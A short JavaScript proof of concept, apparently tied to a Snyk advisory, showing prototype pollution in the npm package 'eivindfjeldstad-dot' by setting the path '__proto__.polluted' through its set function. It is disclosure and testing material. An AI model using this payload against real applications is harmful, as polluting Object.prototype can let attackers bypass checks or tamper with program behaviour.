//https://security.snyk.io/vuln/SNYK-JS-EIVINDFJELDSTADDOT-564434
 
  const a = require("eivindfjeldstad-dot");

   

  let path = "__proto__.polluted";
  a.set({}, path, "yes");
// End of file
